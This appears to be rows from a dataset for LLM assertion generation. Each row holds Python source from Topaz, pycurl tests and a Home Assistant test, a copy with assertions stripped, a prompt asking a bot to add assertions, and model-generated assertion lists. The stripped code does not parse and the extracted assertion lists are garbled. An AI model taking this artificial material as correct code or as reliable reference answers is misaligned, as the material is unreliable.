62        self.values = {}
63        self.version = VersionTag()
64
65    def __deepcopy__(self, memo):
66        c = object.__new__(self.__class__)
67        c.values = copy.deepcopy(self.values, memo)
68        c.version = copy.deepcopy(self.version, memo)
69        return c
70
71    def __iter__(self):
72        return iter(self.values)
73
74    def mutated(self):
75        self.version = VersionTag()
76
77    @jit.elidable
78    def _get_cell(self, name, version):
79        return self.values.get(name, None)
80
81    def get(self, space, name):
82        cell = self._get_cell(name, self.version)
83        if isinstance(cell, BaseCell):
84            return cell.getvalue(space, name)
85        else:
86            return cell
87
88    def set(self, space, name, w_value):
89        cell = self._get_cell(name, self.version)
90        if isinstance(cell, BaseCell):
91            cell.setvalue(space, name, w_value)
92        else:
93            if cell is not None:
94                w_value = Cell(w_value)
95            self.mutated()
96            self.values[name] = w_value
97
98    def delete(self, name):
99        try:
100            del self.values[name]
101        except KeyError:
102            pass
103        else:
104            self.mutated()
105
106
107class GlobalsDict(CellDict):
108    def define_virtual(self, name, getter, setter=None):
109        self.mutated()
110        self.values[name] = GetterSetterCell(getter, setter)
111","[['version', '==', 'self.version']]",1,1,1.0,0.0003519887363604,"['memo', 'memo[id(self)]', 'w_value', 'self.w_value', 'obj', 'obj.w_value', 'space', 'name', '_immutable_fields_', 'getter', 'setter', 'self.getter', 'self.setter', 'obj.getter', 'obj.setter', 'self.values', 'self.version', 'c', 'c.values', 'c.version', 'version', 'cell', 'self.values[name]']",23,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['memo', 'memo[id(self)]', 'w_value', 'self.w_value', 'obj', 'obj.w_value', 'space', 'name', '_immutable_fields_', 'getter', 'setter', 'self.getter', 'self.setter', 'obj.getter', 'obj.setter', 'self.values', 'self.version', 'c', 'c.values', 'c.version', 'version', 'cell', 'self.values[name]']
*Code:

1import copy
2
3from rpython.rlib import jit
4
5from topaz.objects.objectobject import W_Root
6
7
8class VersionTag(object):
9    def __deepcopy__(self, memo):
10        memo[id(self)] = result = VersionTag()
11        return result
12
13
14class BaseCell(W_Root):
15    pass
16
17
18class Cell(BaseCell):
19    def __init__(self, w_value):
20        self.w_value = w_value
21
22    def __deepcopy__(self, memo):
23        obj = super(Cell, self).__deepcopy__(memo)
24        obj.w_value = copy.deepcopy(self.w_value, memo)
25        return obj
26
27    def getvalue(self, space, name):
28        return self.w_value
29
30    def setvalue(self, space, name, w_value):
31        self.w_value = w_value
32
33
34class GetterSetterCell(BaseCell):
35    _immutable_fields_ = [""getter"", ""setter""]
36
37    def __init__(self, getter, setter=None):
38        self.getter = getter
39        self.setter = setter
40
41    def __deepcopy__(self, memo):
42        obj = super(GetterSetterCell, self).__deepcopy__(memo)
43        obj.getter = copy.deepcopy(self.getter, memo)
44        obj.setter = copy.deepcopy(self.setter, memo)
45        return obj
46
47    def getvalue(self, space, name):
48        return self.getter(space)
49
50    def setvalue(self, space, name, w_value):
51        if self.setter is None:
52            raise space.error(space.w_NameError,
53                ""%s is a read-only variable"" % name
54            )
55        self.setter(space, w_value)
56
57
58class CellDict(object):
59    _immutable_fields_ = [""version?""]
60
61    def __init__(self):
62        self.values = {}
63        self.version = VersionTag()
64
65    def __deepcopy__(self, memo):
66        c = object.__new__(self.__class__)
67        c.values = copy.deepcopy(self.values, memo)
68        c.version = copy.deepcopy(self.version, memo)
69        return c
70
71    def __iter__(self):
72        return iter(self.values)
73
74    def mutated(self):
75        self.version = VersionTag()
76
77    @jit.elidable
78    def _get_cell(self, name, version):
79        return self.values.get(name, None)
80
81    def get(self, space, name):
82        cell = self._get_cell(name, self.version)
83        if isinstance(cell, BaseCell):
84            return cell.getvalue(space, name)
85        else:
86            return cell
87
88    def set(self, space, name, w_value):
89        cell = self._get_cell(name, self.version)
90        if isinstance(cell, BaseCell):
91            cell.setvalue(space, name, w_value)
92        else:
93            if cell is not None:
94                w_value = Cell(w_value)
95            self.mutated()
96            self.values[name] = w_value
97
98    def delete(self, name):
99        try:
100            del self.values[name]
101        except KeyError:
102            pass
103        else:
104            self.mutated()
105
106
107class GlobalsDict(CellDict):
108    def define_virtual(self, name, getter, setter=None):
109        self.mutated()
110        self.values[name] = GetterSetterCell(getter, setter)
111",4701,"[[19, 'w_value', '!=', None, 'w_value should not be none, need it for initialisation'],
 [39, 'getter', '!=', None, ""getter should not be none, it's required for GetterSetterCell""],
[42, 'self.getter', '!=', None, 'self.getter should already exist and not be none before deepcopy'],
 [44, 'self.setter', '!=', None, 'self.setter should already exist and not be none before deepcopy'],
 [62, 'self.values', '==', {}, 'self.values should be initialized as empty dictionary'],
[63, 'self.version', '!=', None, 'self.version should not be none, need it for initialisation'],
[67, 'self.values', '!=', None, 'self.values should already exist and not be none before deepcopy'],
[68, 'self.version', '!=', None, 'self.version should already exist and not be none before deepcopy'],
[88, 'w_value', '!=', None, 'w_value should not be none, need it for updating values'],
[108, 'getter', '!=', None, ""getter should not be none, it's required for defining virtual""],
[110, 'self.values[name]', '!=', None, 'value of values[name] should not be none']]"
andrewleech/script.module.pycurl,"#! /usr/bin/env python
# -*- coding: utf-8 -*-
# vi:ts=4:et

import pycurl
import unittest
try:
    import cPickle
except ImportError:
    cPickle = None
import pickle
import copy

from . import util

class InternalsTest(unittest.TestCase):
    def setUp(self):
        self.curl = pycurl.Curl()
    
    def tearDown(self):
        self.curl.close()
        del self.curl
    
    # /***********************************************************************
    # // test misc
    # ************************************************************************/
    
    def test_constant_aliasing(self):
        assert self.curl.URL is pycurl.URL
    
    # /***********************************************************************
    # // test handles
    # ************************************************************************/

    def test_remove_invalid_handle(self):
        m = pycurl.CurlMulti()
        try:
            m.remove_handle(self.curl)
        except pycurl.error:
            pass
        else:
            assert False, ""No exception when trying to remove a handle that is not in CurlMulti""
        del m
    
    def test_remove_invalid_closed_handle(self):
        m = pycurl.CurlMulti()
        c = pycurl.Curl()
        c.close()
        m.remove_handle(c)
        del m, c
    
    def test_add_closed_handle(self):
        m = pycurl.CurlMulti()
        c = pycurl.Curl()
        c.close()
        try:
            m.add_handle(c)
        except pycurl.error:
            pass
        else:
            assert 0, ""No exception when trying to add a close handle to CurlMulti""
        m.close()
        del m, c
    
    def test_add_handle_twice(self):
        m = pycurl.CurlMulti()
        m.add_handle(self.curl)
        try:
            m.add_handle(self.curl)
        except pycurl.error:
            pass
        else:
            assert 0, ""No exception when trying to add the same handle twice""
        del m
    
    def test_add_handle_on_multiple_stacks(self):
        m1 = pycurl.CurlMulti()
        m2 = pycurl.CurlMulti()
        m1.add_handle(self.curl)
        try:
            m2.add_handle(self.curl)
        except pycurl.error:
            pass
        else:
            assert 0, ""No exception when trying to add the same handle on multiple stacks""
        del m1, m2
    
    def test_move_handle(self):
        m1 = pycurl.CurlMulti()
        m2 = pycurl.CurlMulti()
        m1.add_handle(self.curl)
        m1.remove_handle(self.curl)
        m2.add_handle(self.curl)
        del m1, m2
    
    # /***********************************************************************
    # // test copying and pickling - copying and pickling of
    # // instances of Curl and CurlMulti is not allowed
    # ************************************************************************/

    def test_copy_curl(self):
        try:
            copy.copy(self.curl)
        # python 2 raises copy.Error, python 3 raises TypeError
        except (copy.Error, TypeError):
            pass
        else:
            assert False, ""No exception when trying to copy a Curl handle""
    
    def test_copy_multi(self):
        m = pycurl.CurlMulti()
        try:
            copy.copy(m)
        except (copy.Error, TypeError):
            pass
        else:
            assert False, ""No exception when trying to copy a CurlMulti handle""
    
    def test_copy_multi(self):
        s = pycurl.CurlShare()
        try:
            copy.copy(s)
        except (copy.Error, TypeError):
            pass
        else:
            assert False, ""No exception when trying to copy a CurlShare handle""
    
    def test_pickle_curl(self):
        fp = util.StringIO()
        p = pickle.Pickler(fp, 1)
        try:
            p.dump(self.curl)
        # python 2 raises pickle.PicklingError, python 3 raises TypeError
        except (pickle.PicklingError, TypeError):
            pass
        else:
            assert 0, ""No exception when trying to pickle a Curl handle""
        del fp, p
    
    def test_pickle_multi(self):
        m = pycurl.CurlMulti()
        fp = util.StringIO()
        p = pickle.Pickler(fp, 1)
        try:
            p.dump(m)
        except (pickle.PicklingError, TypeError):
            pass
        else:
            assert 0, ""No exception when trying to pickle a CurlMulti handle""
        del m, fp, p
    
    def test_pickle_share(self):
        s = pycurl.CurlShare()
        fp = util.StringIO()
        p = pickle.Pickler(fp, 1)
        try:
            p.dump(s)
        except (pickle.PicklingError, TypeError):
            pass
        else:
            assert 0, ""No exception when trying to pickle a CurlShare handle""
        del s, fp, p
    
    def test_pickle_dumps_curl(self):
        try:
            pickle.dumps(self.curl)
        # python 2 raises pickle.PicklingError, python 3 raises TypeError
        except (pickle.PicklingError, TypeError):
            pass
        else:
            self.fail(""No exception when trying to pickle a Curl handle"")
    
    def test_pickle_dumps_multi(self):
        m = pycurl.CurlMulti()
        try:
            pickle.dumps(m)
        except (pickle.PicklingError, TypeError):
            pass
        else:
            self.fail(""No exception when trying to pickle a CurlMulti handle"")
    
    def test_pickle_dumps_share(self):
        s = pycurl.CurlShare()
        try:
            pickle.dumps(s)
        except (pickle.PicklingError, TypeError):
            pass
        else:
            self.fail(""No exception when trying to pickle a CurlShare handle"")
    
    if cPickle is not None:
        def test_cpickle_curl(self):
            fp = util.StringIO()
            p = cPickle.Pickler(fp, 1)
            try:
                p.dump(self.curl)
            except cPickle.PicklingError:
                pass
            else:
                assert 0, ""No exception when trying to pickle a Curl handle via cPickle""
            del fp, p
        
        def test_cpickle_multi(self):
            m = pycurl.CurlMulti()
            fp = util.StringIO()
            p = cPickle.Pickler(fp, 1)
            try:
                p.dump(m)
            except cPickle.PicklingError:
                pass
            else:
                assert 0, ""No exception when trying to pickle a CurlMulti handle via cPickle""
            del m, fp, p
        
        def test_cpickle_share(self):
            s = pycurl.CurlMulti()
            fp = util.StringIO()
            p = cPickle.Pickler(fp, 1)
            try:
                p.dump(s)
            except cPickle.PicklingError:
                pass
            else:
                assert 0, ""No exception when trying to pickle a CurlShare handle via cPickle""
            del s, fp, p
","
1#! /usr/bin/env python
2# -*- coding: utf-8 -*-
3# vi:ts=4:et
4
5import pycurl
6import unittest
7try:
8    import cPickle
9except ImportError:
10    cPickle = None
11import pickle
12import copy
13
14from . import util
15
16class InternalsTest(unittest.TestCase):
17    def setUp(self):
18        self.curl = pycurl.Curl()
19    
20    def tearDown(self):
21        self.curl.close()
22        del self.curl
23    
24    # /***********************************************************************
25    # // test misc
26    # ************************************************************************/
27    
28    def test_constant_aliasing(self):
29    
30    # /***********************************************************************
31    # // test handles
32    # ************************************************************************/
33
34    def test_remove_invalid_handle(self):
35        m = pycurl.CurlMulti()
36        try:
37            m.remove_handle(self.curl)
38        except pycurl.error:
39            pass
40        else:
41        del m
42    
43    def test_remove_invalid_closed_handle(self):
44        m = pycurl.CurlMulti()
45        c = pycurl.Curl()
46        c.close()
47        m.remove_handle(c)
48        del m, c
49    
50    def test_add_closed_handle(self):
51        m = pycurl.CurlMulti()
52        c = pycurl.Curl()
53        c.close()
54        try:
55            m.add_handle(c)
56        except pycurl.error:
57            pass
58        else:
59        m.close()
60        del m, c
61    
62    def test_add_handle_twice(self):
63        m = pycurl.CurlMulti()
64        m.add_handle(self.curl)
65        try:
66            m.add_handle(self.curl)
67        except pycurl.error:
68            pass
69        else:
70        del m
71    
72    def test_add_handle_on_multiple_stacks(self):
73        m1 = pycurl.CurlMulti()
74        m2 = pycurl.CurlMulti()
75        m1.add_handle(self.curl)
76        try:
77            m2.add_handle(self.curl)
78        except pycurl.error:
79            pass
80        else:
81        del m1, m2
82    
83    def test_move_handle(self):
84        m1 = pycurl.CurlMulti()
85        m2 = pycurl.CurlMulti()
86        m1.add_handle(self.curl)
87        m1.remove_handle(self.curl)
88        m2.add_handle(self.curl)
89        del m1, m2
90    
91    # /***********************************************************************
92    # // test copying and pickling - copying and pickling of
93    # // instances of Curl and CurlMulti is not allowed
94    # ************************************************************************/
95
96    def test_copy_curl(self):
97        try:
98            copy.copy(self.curl)
99        # python 2 raises copy.Error, python 3 raises TypeError
100        except (copy.Error, TypeError):
101            pass
102        else:
103    
104    def test_copy_multi(self):
105        m = pycurl.CurlMulti()
106        try:
107            copy.copy(m)
108        except (copy.Error, TypeError):
109            pass
110        else:
111    
112    def test_copy_multi(self):
113        s = pycurl.CurlShare()
114        try:
115            copy.copy(s)
116        except (copy.Error, TypeError):
117            pass
118        else:
119    
120    def test_pickle_curl(self):
121        fp = util.StringIO()
122        p = pickle.Pickler(fp, 1)
123        try:
124            p.dump(self.curl)
125        # python 2 raises pickle.PicklingError, python 3 raises TypeError
126        except (pickle.PicklingError, TypeError):
127            pass
128        else:
129        del fp, p
130    
131    def test_pickle_multi(self):
132        m = pycurl.CurlMulti()
133        fp = util.StringIO()
134        p = pickle.Pickler(fp, 1)
135        try:
136            p.dump(m)
137        except (pickle.PicklingError, TypeError):
138            pass
139        else:
140        del m, fp, p
141    
142    def test_pickle_share(self):
143        s = pycurl.CurlShare()
144        fp = util.StringIO()
145        p = pickle.Pickler(fp, 1)
146        try:
147            p.dump(s)
148        except (pickle.PicklingError, TypeError):
149            pass
150        else:
151        del s, fp, p
152    
153    def test_pickle_dumps_curl(self):
154        try:
155            pickle.dumps(self.curl)
156        # python 2 raises pickle.PicklingError, python 3 raises TypeError
157        except (pickle.PicklingError, TypeError):
158            pass
159        else:
160            self.fail(""No exception when trying to pickle a Curl handle"")
161    
162    def test_pickle_dumps_multi(self):
163        m = pycurl.CurlMulti()
164        try:
165            pickle.dumps(m)
166        except (pickle.PicklingError, TypeError):
167            pass
168        else:
169            self.fail(""No exception when trying to pickle a CurlMulti handle"")
170    
171    def test_pickle_dumps_share(self):
172        s = pycurl.CurlShare()
173        try:
174            pickle.dumps(s)
175        except (pickle.PicklingError, TypeError):
176            pass
177        else:
178            self.fail(""No exception when trying to pickle a CurlShare handle"")
179    
180    if cPickle is not None:
181        def test_cpickle_curl(self):
182            fp = util.StringIO()
183            p = cPickle.Pickler(fp, 1)
184            try:
185                p.dump(self.curl)
186            except cPickle.PicklingError:
187                pass
188            else:
189            del fp, p
190        
191        def test_cpickle_multi(self):
192            m = pycurl.CurlMulti()
193            fp = util.StringIO()
194            p = cPickle.Pickler(fp, 1)
195            try:
196                p.dump(m)
197            except cPickle.PicklingError:
198                pass
199            else:
200            del m, fp, p
201        
202        def test_cpickle_share(self):
203            s = pycurl.CurlMulti()
204            fp = util.StringIO()
205            p = cPickle.Pickler(fp, 1)
206            try:
207                p.dump(s)
208            except cPickle.PicklingError:
209                pass
210            else:
211            del s, fp, p
212","[['self.curl.URL', '==', 'pycurl.URL'], ['0', '==', 'True'], ['le', 'to', 'CurlMulti""'], ['0', '==', 'True'], ['le', 'twice""'], ['0', '==', 'True'], ['le', 'on', 'multiple', 'stacks""'], ['False', '==', 'True'], ['le""', '==', 'True'], ['False', '==', 'True'], ['le""', '==', 'True'], ['False', '==', 'True'], ['le""', '==', 'True'], ['0', '==', 'True'], ['le""', '==', 'True'], ['0', '==', 'True'], ['le""', '==', 'True'], ['0', '==', 'True'], ['le""', '==', 'True'], ['0', '==', 'True'], ['le', 'via', 'cPickle""'], ['0', '==', 'True'], ['le', 'via', 'cPickle""'], ['0', '==', 'True'], ['le', 'via', 'cPickle""']]",14,25,1.7857142857142858,0.003703155088135,"['cPickle', 'self.curl', 'm', 'c', 'm1', 'm2', 's', 'fp', 'p']",9,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['cPickle', 'self.curl', 'm', 'c', 'm1', 'm2', 's', 'fp', 'p']
*Code:

1#! /usr/bin/env python
2# -*- coding: utf-8 -*-
3# vi:ts=4:et
4
5import pycurl
6import unittest
7try:
8    import cPickle
9except ImportError:
10    cPickle = None
11import pickle
12import copy
13
14from . import util
15
16class InternalsTest(unittest.TestCase):
17    def setUp(self):
18        self.curl = pycurl.Curl()
19    
20    def tearDown(self):
21        self.curl.close()
22        del self.curl
23    
24    # /***********************************************************************
25    # // test misc
26    # ************************************************************************/
27    
28    def test_constant_aliasing(self):
29    
30    # /***********************************************************************
31    # // test handles
32    # ************************************************************************/
33
34    def test_remove_invalid_handle(self):
35        m = pycurl.CurlMulti()
36        try:
37            m.remove_handle(self.curl)
38        except pycurl.error:
39            pass
40        else:
41        del m
42    
43    def test_remove_invalid_closed_handle(self):
44        m = pycurl.CurlMulti()
45        c = pycurl.Curl()
46        c.close()
47        m.remove_handle(c)
48        del m, c
49    
50    def test_add_closed_handle(self):
51        m = pycurl.CurlMulti()
52        c = pycurl.Curl()
53        c.close()
54        try:
55            m.add_handle(c)
56        except pycurl.error:
57            pass
58        else:
59        m.close()
60        del m, c
61    
62    def test_add_handle_twice(self):
63        m = pycurl.CurlMulti()
64        m.add_handle(self.curl)
65        try:
66            m.add_handle(self.curl)
67        except pycurl.error:
68            pass
69        else:
70        del m
71    
72    def test_add_handle_on_multiple_stacks(self):
73        m1 = pycurl.CurlMulti()
74        m2 = pycurl.CurlMulti()
75        m1.add_handle(self.curl)
76        try:
77            m2.add_handle(self.curl)
78        except pycurl.error:
79            pass
80        else:
81        del m1, m2
82    
83    def test_move_handle(self):
84        m1 = pycurl.CurlMulti()
85        m2 = pycurl.CurlMulti()
86        m1.add_handle(self.curl)
87        m1.remove_handle(self.curl)
88        m2.add_handle(self.curl)
89        del m1, m2
90    
91    # /***********************************************************************
92    # // test copying and pickling - copying and pickling of
93    # // instances of Curl and CurlMulti is not allowed
94    # ************************************************************************/
95
96    def test_copy_curl(self):
97        try:
98            copy.copy(self.curl)
99        # python 2 raises copy.Error, python 3 raises TypeError
100        except (copy.Error, TypeError):
101            pass
102        else:
103    
104    def test_copy_multi(self):
105        m = pycurl.CurlMulti()
106        try:
107            copy.copy(m)
108        except (copy.Error, TypeError):
109            pass
110        else:
111    
112    def test_copy_multi(self):
113        s = pycurl.CurlShare()
114        try:
115            copy.copy(s)
116        except (copy.Error, TypeError):
117            pass
118        else:
119    
120    def test_pickle_curl(self):
121        fp = util.StringIO()
122        p = pickle.Pickler(fp, 1)
123        try:
124            p.dump(self.curl)
125        # python 2 raises pickle.PicklingError, python 3 raises TypeError
126        except (pickle.PicklingError, TypeError):
127            pass
128        else:
129        del fp, p
130    
131    def test_pickle_multi(self):
132        m = pycurl.CurlMulti()
133        fp = util.StringIO()
134        p = pickle.Pickler(fp, 1)
135        try:
136            p.dump(m)
137        except (pickle.PicklingError, TypeError):
138            pass
139        else:
140        del m, fp, p
141    
142    def test_pickle_share(self):
143        s = pycurl.CurlShare()
144        fp = util.StringIO()
145        p = pickle.Pickler(fp, 1)
146        try:
147            p.dump(s)
148        except (pickle.PicklingError, TypeError):
149            pass
150        else:
151        del s, fp, p
152    
153    def test_pickle_dumps_curl(self):
154        try:
155            pickle.dumps(self.curl)
156        # python 2 raises pickle.PicklingError, python 3 raises TypeError
157        except (pickle.PicklingError, TypeError):
158            pass
159        else:
160            self.fail(""No exception when trying to pickle a Curl handle"")
161    
162    def test_pickle_dumps_multi(self):
163        m = pycurl.CurlMulti()
164        try:
165            pickle.dumps(m)
166        except (pickle.PicklingError, TypeError):
167            pass
168        else:
169            self.fail(""No exception when trying to pickle a CurlMulti handle"")
170    
171    def test_pickle_dumps_share(self):
172        s = pycurl.CurlShare()
173        try:
174            pickle.dumps(s)
175        except (pickle.PicklingError, TypeError):
176            pass
177        else:
178            self.fail(""No exception when trying to pickle a CurlShare handle"")
179    
180    if cPickle is not None:
181        def test_cpickle_curl(self):
182            fp = util.StringIO()
183            p = cPickle.Pickler(fp, 1)
184            try:
185                p.dump(self.curl)
186            except cPickle.PicklingError:
187                pass
188            else:
189            del fp, p
190        
191        def test_cpickle_multi(self):
192            m = pycurl.CurlMulti()
193            fp = util.StringIO()
194            p = cPickle.Pickler(fp, 1)
195            try:
196                p.dump(m)
197            except cPickle.PicklingError:
198                pass
199            else:
200            del m, fp, p
201        
202        def test_cpickle_share(self):
203            s = pycurl.CurlMulti()
204            fp = util.StringIO()
205            p = cPickle.Pickler(fp, 1)
206            try:
207                p.dump(s)
208            except cPickle.PicklingError:
209                pass
210            else:
211            del s, fp, p
212",7588,"[17, 'self.curl', '!=', None, ""self.curl should be an instance of pycurl.Curl after setup""],
[35, 'm', '!=', None, ""m should be an instance of pycurl.CurlMulti""],
[44, 'm', '!=', None, ""m should be an instance of pycurl.CurlMulti""],
[44, 'c', '!=', None, ""c should be an instance of pycurl.Curl""],
[51, 'm', '!=', None, ""m should be an instance of pycurl.CurlMulti""],
[51, 'c', '!=', None, ""c should be an instance of pycurl.Curl""],
[63, 'm', '!=', None, ""m should be an instance of pycurl.CurlMulti""],
[73, 'm1', '!=', None, ""m1 should be an instance of pycurl.CurlMulti""],
[73, 'm2', '!=', None, ""m2 should be an instance of pycurl.CurlMulti""],
[84, 'm1', '!=', None, ""m1 should be an instance of pycurl.CurlMulti""],
[84, 'm2', '!=', None, ""m2 should be an instance of pycurl.CurlMulti""],
[105, 'm', '!=', None, ""m should be an instance of pycurl.CurlMulti""],
[113, 's', '!=', None, ""s should be an instance of pycurl.CurlShare""],
[132, 'm', '!=', None, ""m should be an instance of pycurl.CurlMulti""],
[132, 'fp', '!=', None, ""fp should be an instance of StringIO from util""],
[142, 's', '!=', None, ""s should be an instance of pycurl.CurlShare""],
[142, 'fp', '!=', None, ""fp should be an instance of StringIO from util""],
[154, 'self.curl', '!=', None, ""self.curl should be an instance of pycurl.Curl""],
[163, 'm', '!=', None, ""m should be an instance of pycurl.CurlMulti""],
[172, 's', '!=', None, ""s should be an instance of pycurl.CurlShare""],
[182, 'fp', '!=', None, ""fp should be an instance of StringIO from util""],
[192, 'm', '!=', None, ""m should be an instance of pycurl.CurlMulti""],
[192, 'fp', '!=', None, ""fp should be an instance of StringIO from util""],
[203, 's', '!=', None, ""s should be an instance of pycurl.CurlMulti""],
[203, 'fp', '!=', None, ""fp should be an instance of StringIO from util""]]"
rohitranjan1991/home-assistant,"""""""Make sure that handling real world LG HomeKit characteristics isn't broken.""""""

from homeassistant.components.media_player.const import (
    SUPPORT_PAUSE,
    SUPPORT_PLAY,
    SUPPORT_SELECT_SOURCE,
)

from tests.components.homekit_controller.common import (
    HUB_TEST_ACCESSORY_ID,
    DeviceTestInfo,
    EntityTestInfo,
    assert_devices_and_entities_created,
    setup_accessories_from_file,
    setup_test_accessories,
)


async def test_lg_tv(hass):
    """"""Test that a Koogeek LS1 can be correctly setup in HA.""""""
    accessories = await setup_accessories_from_file(hass, ""lg_tv.json"")
    await setup_test_accessories(hass, accessories)

    await assert_devices_and_entities_created(
        hass,
        DeviceTestInfo(
            unique_id=HUB_TEST_ACCESSORY_ID,
            name=""LG webOS TV AF80"",
            model=""OLED55B9PUA"",
            manufacturer=""LG Electronics"",
            sw_version=""04.71.04"",
            hw_version=""1"",
            serial_number=""999AAAAAA999"",
            devices=[],
            entities=[
                EntityTestInfo(
                    entity_id=""media_player.lg_webos_tv_af80"",
                    friendly_name=""LG webOS TV AF80"",
                    unique_id=""homekit-999AAAAAA999-48"",
                    supported_features=(
                        SUPPORT_PAUSE | SUPPORT_PLAY | SUPPORT_SELECT_SOURCE
                    ),
                    capabilities={
                        ""source_list"": [
                            ""AirPlay"",
                            ""Live TV"",
                            ""HDMI 1"",
                            ""Sony"",
                            ""Apple"",
                            ""AV"",
                            ""HDMI 4"",
                        ]
                    },
                    # The LG TV doesn't (at least at this patch level) report
                    # its media state via CURRENT_MEDIA_STATE. Therefore ""ok""
                    # is the best we can say.
                    state=""ok"",
                ),
            ],
        ),
    )

    """"""
    assert state.attributes[""source""] == ""HDMI 4""
    """"""
","
1""""""Make sure that handling real world LG HomeKit characteristics isn't broken.""""""
2
3from homeassistant.components.media_player.const import (
4    SUPPORT_PAUSE,
5    SUPPORT_PLAY,
6    SUPPORT_SELECT_SOURCE,
7)
8
9from tests.components.homekit_controller.common import (
10    HUB_TEST_ACCESSORY_ID,
11    DeviceTestInfo,
12    EntityTestInfo,
13    setup_accessories_from_file,
14    setup_test_accessories,
15)
16
17
18async def test_lg_tv(hass):
19    """"""Test that a Koogeek LS1 can be correctly setup in HA.""""""
20    accessories = await setup_accessories_from_file(hass, ""lg_tv.json"")
21    await setup_test_accessories(hass, accessories)
22
23        hass,
24        DeviceTestInfo(
25            unique_id=HUB_TEST_ACCESSORY_ID,
26            name=""LG webOS TV AF80"",
27            model=""OLED55B9PUA"",
28            manufacturer=""LG Electronics"",
29            sw_version=""04.71.04"",
30            hw_version=""1"",
31            serial_number=""999AAAAAA999"",
32            devices=[],
33            entities=[
34                EntityTestInfo(
35                    entity_id=""media_player.lg_webos_tv_af80"",
36                    friendly_name=""LG webOS TV AF80"",
37                    unique_id=""homekit-999AAAAAA999-48"",
38                    supported_features=(
39                        SUPPORT_PAUSE | SUPPORT_PLAY | SUPPORT_SELECT_SOURCE
40                    ),
41                    capabilities={
42                        ""source_list"": [
43                            ""AirPlay"",
44                            ""Live TV"",
45                            ""HDMI 1"",
46                            ""Sony"",
47                            ""Apple"",
48                            ""AV"",
49                            ""HDMI 4"",
50                        ]
51                    },
52                    # The LG TV doesn't (at least at this patch level) report
53                    # its media state via CURRENT_MEDIA_STATE. Therefore ""ok""
54                    # is the best we can say.
55                    state=""ok"",
56                ),
57            ],
58        ),
59    )
60
61    """"""
62    """"""
63","[['_entities_created', '==', 'True'], ['_entities_created(', '==', 'True'], ['state.attributes[""source""]', '==', '""HDMI 4""']]",3,3,1.0,0.0014051522248243,"['hass', 'accessories']",2,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['hass', 'accessories']
*Code:

1""""""Make sure that handling real world LG HomeKit characteristics isn't broken.""""""
2
3from homeassistant.components.media_player.const import (
4    SUPPORT_PAUSE,
5    SUPPORT_PLAY,
6    SUPPORT_SELECT_SOURCE,
7)
8
9from tests.components.homekit_controller.common import (
10    HUB_TEST_ACCESSORY_ID,
11    DeviceTestInfo,
12    EntityTestInfo,
13    setup_accessories_from_file,
14    setup_test_accessories,
15)
16
17
18async def test_lg_tv(hass):
19    """"""Test that a Koogeek LS1 can be correctly setup in HA.""""""
20    accessories = await setup_accessories_from_file(hass, ""lg_tv.json"")
21    await setup_test_accessories(hass, accessories)
22
23        hass,
24        DeviceTestInfo(
25            unique_id=HUB_TEST_ACCESSORY_ID,
26            name=""LG webOS TV AF80"",
27            model=""OLED55B9PUA"",
28            manufacturer=""LG Electronics"",
29            sw_version=""04.71.04"",
30            hw_version=""1"",
31            serial_number=""999AAAAAA999"",
32            devices=[],
33            entities=[
34                EntityTestInfo(
35                    entity_id=""media_player.lg_webos_tv_af80"",
36                    friendly_name=""LG webOS TV AF80"",
37                    unique_id=""homekit-999AAAAAA999-48"",
38                    supported_features=(
39                        SUPPORT_PAUSE | SUPPORT_PLAY | SUPPORT_SELECT_SOURCE
40                    ),
41                    capabilities={
42                        ""source_list"": [
43                            ""AirPlay"",
44                            ""Live TV"",
45                            ""HDMI 1"",
46                            ""Sony"",
47                            ""Apple"",
48                            ""AV"",
49                            ""HDMI 4"",
50                        ]
51                    },
